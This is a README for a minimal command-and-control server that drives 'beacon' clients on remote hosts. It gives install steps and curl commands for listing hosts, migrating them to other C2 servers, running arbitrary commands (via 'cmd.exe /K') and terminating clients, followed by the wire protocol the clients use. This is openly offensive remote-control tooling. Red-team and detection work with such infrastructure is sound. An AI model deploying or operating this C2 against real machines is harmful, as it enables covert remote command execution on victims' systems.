# c2

Simplistic C2 infra using fairly dumb beacon clients. 

## Usage

```
sh install.sh # install dependencies and generate self signed cert
sudo python3 server.py 443 # sudo only required to run on port 443

# list hosts
curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:L::"

# migrate host to other c2 servers
curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:N:HOST:y.y.y.y:y,z.z.z.z:z"

# execute command on host
curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:C:HOST:ls -al"

# show command output from host
curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:I:HOST:"

# terminate client on host
curl -X POST --insecure https://x.x.x.x/cmd -d "SECRET:T:HOST:"
```

## Client Specification

```
POST / HTTP/1.1
host: proxy-to-c2

IDEN:OUTPUT...

HTTP/1.1 200 OK

C:PARAMETERS...
```

- `IDEN`: Random 4 letter identifier for host ie. `KUqT`.
- `OUTPUT`: Output generated by last command or nothing.
- `C`: Single letter command identifier:
    - `T`: Terminate C2 client.
    - `N`: Use C2 servers in comma delimited list `PARAMETERS`.
    - `C`: Execute command ie. `cmd.exe /K <PARAMETERS>`.
- `PARAMETERS`: Parameters required by command or nothing.
